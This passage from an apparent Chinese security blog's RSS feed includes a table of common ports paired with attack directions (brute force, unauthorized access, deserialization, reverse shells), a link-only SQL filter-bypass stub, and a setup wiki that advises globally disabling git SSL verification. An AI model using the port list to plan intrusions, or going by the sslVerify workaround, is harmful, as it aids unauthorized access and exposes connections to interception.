    </item>
    
    <item>
      <title>sql关键词绕过</title>
      <link>https://m01ly.github.io/2020/09/10/pt-sqlbypass/</link>
      <guid>https://m01ly.github.io/2020/09/10/pt-sqlbypass/</guid>
      <pubDate>Thu, 10 Sep 2020 08:35:30 GMT</pubDate>
      
      <description>&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><p><a href="https://blog.lgf.im/2018/bypass-tech-for-sql-injection-keyword-filtering.html">https://blog.lgf.im/2018/bypass-tech-for-sql-injection-keyword-filtering.html</a> 较全的基于关键词绕过</p><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a>  基于extractvalue()和updatexml()的报错注入</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/10/pt-sqlbypass/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>常见端口说明和攻击汇总</title>
      <link>https://m01ly.github.io/2020/09/04/pt-portinfo/</link>
      <guid>https://m01ly.github.io/2020/09/04/pt-portinfo/</guid>
      <pubDate>Fri, 04 Sep 2020 08:48:44 GMT</pubDate>
      
      <description>&lt;h3 id=&quot;文件共享服务端口&quot;&gt;&lt;a href=&quot;#文件共享服务端口&quot; class=&quot;headerlink&quot; title=&quot;文件共享服务端口&quot;&gt;&lt;/a&gt;文件共享服务端口&lt;/h3&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><a id="more"></a><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">21、22、69</td><td align="left">Ftp/Tftp文件传输协议</td><td align="left">允许匿名的上传、下载、爆破和嗅探</td></tr><tr><td align="left">2049</td><td align="left">Nfs服务</td><td align="left">配置不当</td></tr><tr><td align="left">139</td><td align="left">Samba服务</td><td align="left">爆破、未授权访问、远程代码执行</td></tr><tr><td align="left">389</td><td align="left">Ldap目录访问协议</td><td align="left">注入、允许匿名访问、弱口令</td></tr></tbody></table><h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">22</td><td align="left">SSH远程连接</td><td align="left">爆破、SSH隧道及内网代理转发、文件传输</td></tr><tr><td align="left">23</td><td align="left">Telnet远程连接</td><td align="left">爆破、嗅探、弱口令</td></tr><tr><td align="left">3389</td><td align="left">Rdp远程桌面链接</td><td align="left">Shitf后门（<code>Window Server 2003</code>以下系统）、爆破</td></tr><tr><td align="left">5900</td><td align="left">VNC</td><td align="left">弱口令爆破</td></tr><tr><td align="left">5623</td><td align="left">PyAnywhere服务</td><td align="left">抓密码、代码执行</td></tr></tbody></table><h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a>Web应用服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">80/443/8080</td><td align="left">常见的Web服务端口</td><td align="left">Web攻击、爆破、对应服务器版本漏洞，心脏滴血等漏洞</td></tr><tr><td align="left">7001/7002</td><td align="left">WebLogic控制台</td><td align="left">Java反序列化、弱口令</td></tr><tr><td align="left">8080/8089</td><td align="left">Jboss/Resin/Jetty/Jenkins</td><td align="left">反序列化、控制器弱口令</td></tr><tr><td align="left">9090</td><td align="left">WebSphere控制台</td><td align="left">Java反序列化、弱口令</td></tr><tr><td align="left">4848</td><td align="left">GlassFish控制台</td><td align="left">弱口令</td></tr><tr><td align="left">1352</td><td align="left">Lotus domino邮件服务</td><td align="left">弱口令、信息泄露、爆破</td></tr><tr><td align="left">10000</td><td align="left">Webmin-Web控制面板</td><td align="left">弱口令</td></tr></tbody></table><h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">3306</td><td align="left">Mysqk</td><td align="left">注入、提权、爆破</td></tr><tr><td align="left">1433</td><td align="left">Mysql数据库</td><td align="left">注入、提权、SA弱口令、爆破</td></tr><tr><td align="left">1521</td><td align="left">Oracle数据库</td><td align="left">TNS爆破、注入、反弹Shell</td></tr><tr><td align="left">5432</td><td align="left">PostgreSQL数据库</td><td align="left">爆破、注入、弱口令</td></tr><tr><td align="left">27017/27018</td><td align="left">MongoDB</td><td align="left">爆破、未授权访问</td></tr><tr><td align="left">6379</td><td align="left">Redis数据库</td><td align="left">尝试未授权访问、弱口令爆破</td></tr><tr><td align="left">5000</td><td align="left">SysBase/DB2数据库</td><td align="left">爆破、注入</td></tr></tbody></table><h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">25</td><td align="left">SMTP邮件服务</td><td align="left">邮件伪造</td></tr><tr><td align="left">110</td><td align="left">POP3协议</td><td align="left">爆破、嗅探</td></tr><tr><td align="left">143</td><td align="left">IMAP协议</td><td align="left">爆破</td></tr></tbody></table><h3 id="网络参加协议端口"><a href="#网络参加协议端口" class="headerlink" title="网络参加协议端口"></a>网络参加协议端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">53</td><td align="left">DNS域名服务器</td><td align="left">允许区域传送、DNS劫持、缓存投毒、欺骗</td></tr><tr><td align="left">67/68</td><td align="left">DHCP服务</td><td align="left">劫持、欺骗</td></tr><tr><td align="left">161</td><td align="left">SNMP协议</td><td align="left">爆破、搜索目标内网信息</td></tr></tbody></table><h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">2181</td><td align="left">Zookeeper服务</td><td align="left">未授权访问</td></tr><tr><td align="left">8069</td><td align="left">Zavvux服务</td><td align="left">远程代码执行、SQL注入</td></tr><tr><td align="left">9200</td><td align="left">9300</td><td align="left">Elasticsearch服务</td></tr><tr><td align="left">11211</td><td align="left">Memcache服务</td><td align="left">未授权访问</td></tr><tr><td align="left">512/513/514</td><td align="left">Linux Rexec服务</td><td align="left">匿名访问、文件上传</td></tr><tr><td align="left">3690</td><td align="left">Svn服务</td><td align="left">Svn泄露、未授权访问</td></tr><tr><td align="left">50000</td><td align="left">SAP Management Console</td><td align="left">远程代码执行</td></tr></tbody></table>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/04/pt-portinfo/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>m01ly-wiki</title>
      <link>https://m01ly.github.io/2020/09/03/m01ly-wiki/</link>
      <guid>https://m01ly.github.io/2020/09/03/m01ly-wiki/</guid>
      <pubDate>Thu, 03 Sep 2020 09:54:02 GMT</pubDate>
      
      <description>&lt;p&gt;本文档仅仅是自己安装软件指南或者安装过程中踩的坑。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文档仅仅是自己安装软件指南或者安装过程中踩的坑。</p><a id="more"></a><h1 id="nohup-out文件过大"><a href="#nohup-out文件过大" class="headerlink" title="nohup.out文件过大"></a>nohup.out文件过大</h1><p>tips:最近发现有不少人在百度这个问题，当初如易我也是初学者，随便从网上搜了一下，就转过来了，不过为了避免搜索结果同质化，为大家提供更翔实的参考，我将nohup.out相关</p><p>知识整理汇总如下：</p><h4 id="1-nohup-out的由来及作用"><a href="#1-nohup-out的由来及作用" class="headerlink" title="1.nohup.out的由来及作用"></a><strong>1.nohup.out的由来及作用</strong></h4><p>用途：LINUX命令用法，不挂断地运行命令。</p><p>语法：nohup Command [ Arg … ] [　&amp; ]</p><p>描述：nohup 命令运行由 Command 参数和任何相关的 Arg 参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用 nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 &amp; （ 表示“and”的符号）到命令的尾部。</p><p>例子： nohup ./startWeblogic.sh &amp; 意思是即使退出ssh界面，命令仍然在后台执行，并且打印过程日志到nohup.out,当然也可以将nohup.out的输出转向到其他文件，高级应用请参考扩展阅读。</p><h4 id="2-nohup-out的查看方式与方法"><a href="#2-nohup-out的查看方式与方法" class="headerlink" title="2.nohup.out的查看方式与方法"></a><strong>2.nohup.out的查看方式与方法</strong></h4><p>实际使用过程中，往往人们为了省心(嗯，没错，就是懒），经常没有给nohup.out进行重定向输出，也没有按日期分割文件，会造成这个文件特别巨大，达到2G或者3G，这个使用想查看文件，搜索出错内容就比较痛苦了。一般有两种方式</p><pre><code>1.linux本机查看：使用tail 命令，查看最新的日志，或滚动监控日志打印。例如命令 tail -1000 nohup.out (查看最后1000行日志文本）　tail -ｆ nohup.out（监控日志打印）2.ftp下载到windown主机查看：一般小的log文件都没有问题，但是过G的，一般的文本文档查看就显得无力了。推荐使用UltraEdit进行打开。1234</code></pre><h4 id="3-nohup-out维护管理方法（清空nohup-out"><a href="#3-nohup-out维护管理方法（清空nohup-out" class="headerlink" title="3.nohup.out维护管理方法（清空nohup.out)"></a><strong>3.nohup.out维护管理方法（清空nohup.out)</strong></h4><p>如上文所述出现了超大号的文件简直是令人讨厌的事情，而且nohup.out会一直一直自己增长下去，如果你的服务器硬盘不给力的话，很容易把应用也挂掉（硬盘没空间 ，啥都玩不转），但是又不能一味的直接删。因为直接删除，可能会造成应用无法打印后续的错误日志，该问题常见于weblogic服务器，jboss服务器等这些大型中间件，这个在生产环境上要尤为注意。</p><p>因此就有了我们不停止服务直接，清空nohup.out文件的方法。<br>两个可以不用停止WEB服务就可以清空nohup.out的命令。</p><pre><code>第一种：cp /dev/null nohup.out第二种：cat /dev/null &gt; nohup.out12</code></pre><p>两个我都用过，不用担心网上所说的性能问题，通常2/3 个G的文件都是1-2秒执行完毕</p><h4 id="4-扩展阅读"><a href="#4-扩展阅读" class="headerlink" title="4.扩展阅读"></a><strong>4.扩展阅读</strong></h4><p>1.nohup的重定向，一劳永逸解决nohup.out文件过大的问题</p><p>以下是定义日志打印级别，除了高于级别2的告警信息记录到log文件外，其余直接不记录</p><pre><code>//只输出错误信息到日志文件nohup ./program &gt;/dev/null 2&gt;log &amp;//什么信息也不要nohup ./program &gt;/dev/null 2&gt;&amp;1 &amp;1234</code></pre><p>2.Linux的3种重定向</p><pre><code>0:表示标准输入1:标准输出,在一般使用时，默认的是标准输出2:标准错误信息输出123</code></pre><p>可以用来指定需要重定向的标准输入或输出。例如，将某个程序的错误信息输出到log文件中：./program 2&gt;log。这样标准输出还是在屏幕上，但是错误信息会输出到log文件中。另外，也可以实现0，1，2之间的重定向。2&gt;&amp;1：将错误信息重定向到标准输出。</p><p>3.关于/dev/null文件<br>Linux下还有一个特殊的文件/dev/null，它就像一个无底洞，所有重定向到它的信息都会消失得无影无踪。这一点非常有用，当我们不需要回显程序的所有信息时，就可以将输出重定向到/dev/null。</p><p><a href="https://blog.csdn.net/rickiyeat/article/details/71158936">https://blog.csdn.net/rickiyeat/article/details/71158936</a></p><h1 id="Pycharm操作"><a href="#Pycharm操作" class="headerlink" title="Pycharm操作"></a>Pycharm操作</h1><h2 id="复制粘贴不能用"><a href="#复制粘贴不能用" class="headerlink" title="复制粘贴不能用"></a>复制粘贴不能用</h2><p><strong>问题：</strong>复制粘贴没有用，一直是如图所示，写入删除也无效</p><p><img src="/2020/09/03/m01ly-wiki/1620286342026.png" alt="1620286342026"></p><p>，按键盘的insert键，就可以写入，但是老是恢复回去。</p><p><strong>解决方案：</strong>取消选择Tools–&gt;Vim Emulator</p><p><img src="/2020/09/03/m01ly-wiki/1620286413720.png" alt="1620286413720"></p><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>直接输入 main 然后按 回车键 或 tab键，就可以了。</p><h4 id="２-１编辑类"><a href="#２-１编辑类" class="headerlink" title="２.１编辑类"></a>２.１编辑类</h4><blockquote><p><strong>Ctrl + 鼠标 跳转到（变量、方法、类）声明</strong></p><p><strong>Ctrl + / 行注释</strong></p><p><strong>Ctrl + Shift + / 块注释</strong></p><p><strong>Ctrl + Shift + ]/[ 选定代码块结束、开始</strong></p><p><strong>Alt + ／ 自动完成（联想）</strong></p><p><strong>Ctrl + Alt + L 代码格式化</strong></p><p><strong>Ctrl + Alt + O 优化导入</strong></p><p><strong>Ctrl + Alt + I 自动缩进</strong></p><p>Tab / Shift + Tab 缩进、不缩进当前行</p><p>Ctrl + D 复制选定的区域或行</p><p>Ctrl + Y 删除选定的行</p></blockquote><h4 id="２-２运行类"><a href="#２-２运行类" class="headerlink" title="２.２运行类"></a>２.２运行类</h4><blockquote><p><strong>Shift + F10 运行</strong></p><p><strong>Shift + F9 调试</strong></p></blockquote><h4 id="２-３调试类"><a href="#２-３调试类" class="headerlink" title="２.３调试类"></a>２.３调试类</h4><blockquote><p><strong>F8 跳过</strong></p><p><strong>F7 进入</strong></p><p>Shift + F8 退出</p><p>Alt + F9 运行游标</p><p>Alt + F8 验证表达式</p><p>Ctrl + Alt + F8 快速验证表达式</p><p>F9 恢复程序</p><p>Ctrl + F8 断点开关</p><p>Ctrl + Shift + F8 查看断点</p></blockquote><h4 id="２-４导航类"><a href="#２-４导航类" class="headerlink" title="２.４导航类"></a>２.４导航类</h4><blockquote><p><strong>Ctrl + N 跳转到类</strong></p><p><strong>Ctrl + Shift + N 跳转到文件</strong></p><p><strong>Alt + Right/Left 跳转到下一个、前一个编辑的选项卡</strong></p><p>F12 回到先前的工具窗口</p><p>Esc 从工具窗口回到编辑窗口</p><p>Shift + Esc 隐藏运行的、最近运行的窗口</p><p>Ctrl + Shift + F4 关闭主动运行的选项卡</p><p>Ctrl + G 查看当前行号、字符号</p><p>Ctrl + E 当前文件弹出</p><p><strong>Ctrl+Alt+Left/Right 后退、前进</strong></p><p>Ctrl+Shift+Backspace 导航到最近编辑区域</p><p>Alt + F1 查找当前文件或标识</p><p><strong>Ctrl+B / Ctrl+Click 跳转到声明</strong></p><p><strong>Ctrl + Alt + B 跳转到实现</strong></p><p><strong>Ctrl + Shift + I查看快速定义</strong></p><p>Ctrl + Shift + B跳转到类型声明</p><p>Ctrl + U跳转到父方法、父类</p><p>Alt + Up/Down跳转到上一个、下一个方法</p><p>Ctrl + ]/[跳转到代码块结束、开始</p><p>Ctrl + F12弹出文件结构</p><p>Ctrl + H类型层次结构</p><p>Ctrl + Shift + H方法层次结构</p><p>Ctrl + Alt + H调用层次结构</p><p>F2 / Shift + F2下一条、前一条高亮的错误</p><p>F4 / Ctrl + Enter编辑资源、查看资源</p><p>Alt + Home显示导航条F11书签开关</p><p>Ctrl + Shift + F11书签助记开关</p><p>Ctrl + #[0-9]跳转到标识的书签</p><p>Shift + F11显示书签</p></blockquote><h4 id="２-５查找／替换类"><a href="#２-５查找／替换类" class="headerlink" title="２.５查找／替换类"></a>２.５查找／替换类</h4><blockquote><p>F3 下一个</p><p>Shift + F3 前一个</p><p>Ctrl + R 替换</p><p>Ctrl + Shift + F 全局查找</p><p>Ctrl + Shift + R 全局替换</p><p>Alt + F7/Ctrl + F7文件中查询用法</p><p>Ctrl + Shift + F7文件中用法高亮显示</p><p>Ctrl + Alt + F7显示用法</p></blockquote><h4 id="２-６重构类"><a href="#２-６重构类" class="headerlink" title="２.６重构类"></a>２.６重构类</h4><blockquote><p>Alt + Delete安全删除</p><p><strong>Shift + F6重命名</strong></p><p>Ctrl + F6更改签名</p><p>Ctrl + Alt + N内联</p><p><strong>Ctrl + Alt + M提取方法</strong></p><p><strong>Ctrl + Alt + V提取属性</strong></p><p><strong>Ctrl + Alt + F提取字段</strong></p><p><strong>Ctrl + Alt + C提取常量</strong></p><p><strong>Ctrl + Alt + P提取参数</strong></p></blockquote><h1 id="Git操作"><a href="#Git操作" class="headerlink" title="Git操作"></a>Git操作</h1><h2 id="linux上传git文件"><a href="#linux上传git文件" class="headerlink" title="linux上传git文件"></a>linux上传git文件</h2><p>（1）下载git项目gitalk，并配置git</p><pre><code>git clone https://github.com/m01ly/gitalkcd gitalk[root@xxx gitalk]# git config --global user.name &quot;m01ly&quot;[root@xxx gitalk]# git config --global user.email 2418093296@qq.com</code></pre><p>(2) 添加所有需要上传的文件和配置到git</p><p><code>git add FILE</code>添加确定的文件FILE<br><code>git add .</code>添加当前目录下所有文件</p><pre><code>cd gitalk[root@xxxx gitalk]# git add .</code></pre><p>（3） 提交文件</p><p>上述命令<strong>必须添加</strong>‘-m’及‘log message’，其中log message可以自己随便填写，否则是提交不成功的，在后面的<strong>push操作</strong>中会提示错误：“error:src refspec master does not match any”</p><pre><code>git commit -m &#39;log message&#39;</code></pre><p><img src="/2020/09/03/m01ly-wiki/1615346141835.png" alt="1615346141835"></p><p>至此，我们就已经<strong>提交文件到本地仓库</strong>了！</p><p>现在我们需要将上述本地仓库里的文件<strong>添加到远程库</strong>！</p><p>（4）在github里添加origin</p><pre><code>git remote add origin https://github.com/m01ly/gitalk.git</code></pre><p><strong>注意：</strong>如果之前配置过一次，再次配置则会提示以下错误：<br><strong>ERROR</strong>：远程 origin 已经存在。<br>此时只需要将远程配置删除，重新添加即可；</p><pre><code>git remote rm origingit remote add origin https://github.com/m01ly/gitalk.git</code></pre><p>再次提交文件即可正常使用</p><p>（5）上传文件</p><pre><code>git push -u origin master</code></pre><p>执行此命令后，git会提示输入github账户的用户名和密码，验证通过后，进行文件上传！</p><p><strong>注意：</strong></p><p><strong>ERROR：</strong>error: src refspec master does not match any.<br>error: failed to push some refs to ‘<a href="https://github.com/m01ly/gitalk.git&#39;">https://github.com/m01ly/gitalk.git&#39;</a></p><p><strong>解决方案：</strong>因为 GitHub 从今年 10 月 1 日起，在该平台上创建的所有新的源代码仓库将默认被命名为 “main”，而不是原先的”master” ，因此运行git branch查看名称，</p><p>a.如果是main，直接运行以下即可。</p><pre><code>git push -u origin main</code></pre><p>b.若为master，则改为按如下方式把本地的 master 仓库名称修改为远端的 main即可：</p><p>重命名命令： git branch -m oldBranchName newBranchName</p><p>例如： git branch -m master main</p><p>再重新push：git push -u origin main</p><p>打开git项目，发现提交成功：</p><p><img src="/2020/09/03/m01ly-wiki/1615357682554.png" alt="1615357682554"></p><p>参考：</p><p><a href="https://www.cnblogs.com/chen8023miss/p/12082093.html">git上传linux文件到GitHub上</a></p><p><a href="https://blog.csdn.net/u014361280/article/details/109703556">Git 常见错误 之 error: src refspec xxx does not match any / error: failed to push some refs to 简单解决方法</a></p><h2 id="linux下载git文件"><a href="#linux下载git文件" class="headerlink" title="linux下载git文件"></a>linux下载git文件</h2><p>(1) gitclone项目</p><pre><code>git clone https://github.com/m01ly/gitalk</code></pre><p>报错</p><pre><code>[root@xxx]# git clone https://github.com/m01ly/gitalkCloning into &#39;gitalk&#39;...fatal: unable to access &#39;https://github.com/m01ly/gitalk/&#39;: Problem with the SSL CA cert (path? access rights?)</code></pre><p>解决方案：将http.sslVerify参数的git全局配置为’false’</p><pre><code>root@xxx:~# git config --global http.sslVerify false</code></pre><h1 id="TLS-安全配置"><a href="#TLS-安全配置" class="headerlink" title="TLS 安全配置"></a>TLS 安全配置</h1><h2 id="DHparam"><a href="#DHparam" class="headerlink" title="DHparam"></a>DHparam</h2><h3 id="Diffie-Hellman-group-smaller-than-2048-bits-漏洞"><a href="#Diffie-Hellman-group-smaller-than-2048-bits-漏洞" class="headerlink" title="Diffie-Hellman group smaller than 2048 bits 漏洞"></a>Diffie-Hellman group smaller than 2048 bits 漏洞</h3><p><strong>漏洞描述：</strong></p><ol><li>Diffie-Hellman group smaller than 2048 bits：</li></ol><p>TLS服务器使用Diffie-Hellman组，质数模长度小于2048位。目前的估计是，一个学术团队可以打破768位素数，而一个国家级团队可以打破1024位素数。</p><ol start="2"><li>TLS/SSL Server Is Using Commonly Used Prime Numbers </li></ol><p>在Diffie-Hellman密钥交换期间，服务器使用一个公共素数或默认质数作为参数。这使得安全会话容易受到预计算攻击。攻击者可以花费大量时间为特定质数生成查找/彩虹表。然后，可以使用此查找表获取握手的共享机密并解密会话。</p><p><strong>漏洞分析：</strong></p><p>漏洞1，只需要重新生成2048位DH参数即可。</p><p>漏洞2，因为用了已知的素数，会导致爆破后破解出密钥，因此只需要升级到2048位参数，在2048位DH组下进行这种攻击的可行性被评估为不确定且未经证实。</p><p><strong>漏洞解决方法：</strong>重新生成2048位dhparams。nginx配置如下，其他容器详见<a href="https://weakdh.org/sysadmin.html">https://weakdh.org/sysadmin.html</a> 。</p><p>1 利用openssl生成2048bit dhparams.pem命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">openssl dhparam -out dhparams.pem 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dh协议文件生成速度随长度增长而急剧增长，使用随机数种子可以加快生成速度，如下所示</p><pre class="line-numbers language-bash"><code class="language-bash">openssl dhparam -rand rand.seed -out dhparams.pem 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2 nginx配置 （nginx.conf文件）：ssl_dhparam dhparams.pem的路径; </p><p><strong>参考：</strong></p><p><a href="https://weakdh.org/sysadmin.html">官方TLS部署Diffie-Hellman指南，包括apache,iis环境下的配置</a>   </p><p>TLS 的nginx安全配置](<a href="https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f">https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f</a>)  </p><p><a href="https://kb.fortinet.com/kb/documentLink.do?externalID=FD43985">https://kb.fortinet.com/kb/documentLink.do?externalID=FD43985</a>   <a href="https://www.rapid7.com/db/vulnerabilities/tls-dh-primes">https://www.rapid7.com/db/vulnerabilities/tls-dh-primes</a> 解决方法</p><p><a href="https://www.openssl.org/docs/man1.1.0/man1/dhparam.html">openssl生成 dhparam具体用法</a>  </p><p><a href="https://weakdh.org/logjam.html">https://weakdh.org/logjam.html</a>   <a href="https://weakdh.org/">https://weakdh.org/</a> 相关DH的攻击</p><p><a href="https://www.cnblogs.com/f-ck-need-u/p/7103791.html">加快生成速度</a>  </p><h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><h2 id="centos-安装sqlmap"><a href="#centos-安装sqlmap" class="headerlink" title="centos 安装sqlmap"></a>centos 安装sqlmap</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git clone https://github.com/sqlmapproject/sqlmap.git</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd sqlmap</span><span class="token punctuation">[</span>root@m01ly sqlmap<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./sqlmap.py -h</span>        ___       __H__ ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;1.4.9.1#dev&amp;#125;</span><span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token keyword">.</span> <span class="token punctuation">[</span>,<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token keyword">.</span><span class="token string">'| . ||___|_  [,]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.orgUsage: python sqlmap.py [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program'</span>s version number and <span class="token keyword">exit</span>  -v VERBOSE            Verbosity level: 0-6 <span class="token punctuation">(</span>default 1<span class="token punctuation">)</span>  Target:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="centos-安装最新nmap"><a href="#centos-安装最新nmap" class="headerlink" title="centos 安装最新nmap"></a>centos 安装最新nmap</h2><p><a href="https://www.linuxidc.com/topicnews.aspx?tid=14">CentOS</a> 7下直接yum安装nmap</p><pre><code># yum install nmap发现并不是最新版本，而且升级一下看看，发现也不能直接升级。只好再直接yum卸载掉。**按官方文档rpm安装最新版本的nmap**[root@localhost www.linuxidc.com]# rpm -vhU https://nmap.org/dist/nmap-7.80-1.x86_64.rpm获取https://nmap.org/dist/nmap-7.80-1.x86_64.rpm准备中...             ################################# [100%]正在升级/安装... 1:nmap-2:7.80-1          ################################# [100%]</code></pre><h1 id="源码安装nmap"><a href="#源码安装nmap" class="headerlink" title="源码安装nmap"></a>源码安装nmap</h1><pre><code>wget https://nmap.org/dist-old/nmap-4.53.tgztar -zxvf nmap-4.53.tgzcd nmap-4.53./configuremakemake installnmap -v</code></pre><p><a href="https://nmap.org/dist-old/">https://nmap.org/dist-old/</a></p><p><a href="https://www.jianshu.com/p/b86c3b114cce">https://www.jianshu.com/p/b86c3b114cce</a></p><h2 id="查看linux具体系统"><a href="#查看linux具体系统" class="headerlink" title="查看linux具体系统"></a>查看linux具体系统</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># lsb_release -a</span>LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarchDistributor ID: CentOSDescription:    CentOS Linux release 7.7.1908 <span class="token punctuation">(</span>Core<span class="token punctuation">)</span>Release:        7.7.1908Codename:       Core<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装kali"><a href="#安装kali" class="headerlink" title="安装kali"></a>安装kali</h2><p><a href="https://blog.csdn.net/qq_43645782/article/details/106190796">https://blog.csdn.net/qq_43645782/article/details/106190796</a></p><p>修改root密码</p><pre class="line-numbers language-bash"><code class="language-bash">root@m01ly:~<span class="token comment" spellcheck="true"># sudo passwd root</span>新的 密码：重新输入新的 密码：passwd：已成功更新密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="centos-安装AWVS"><a href="#centos-安装AWVS" class="headerlink" title="centos 安装AWVS"></a>centos 安装AWVS</h1><p><a href="https://blog.lfoder.cn/2020/06/04/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-AWVS-Nessus-Docker%E7%89%88/">https://blog.lfoder.cn/2020/06/04/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-AWVS-Nessus-Docker%E7%89%88/</a> </p><h1 id="centos-安装docker"><a href="#centos-安装docker" class="headerlink" title="centos 安装docker"></a>centos 安装docker</h1><p><img src="/2020/09/03/m01ly-wiki/1612343038903.png" alt="1612343038903"></p><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p><pre><code>$ sudo yum remove docker \         docker-client \         docker-client-latest \         docker-common \         docker-latest \         docker-latest-logrotate \         docker-logrotate \         docker-engine</code></pre><h4 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>可以选择国内的一些aliyun源地址：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager \    --add-repo \    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启动-Docker。"><a href="#启动-Docker。" class="headerlink" title="启动 Docker。"></a>启动 Docker。</h4><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> docker run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/03/m01ly-wiki/1603272603871.png" 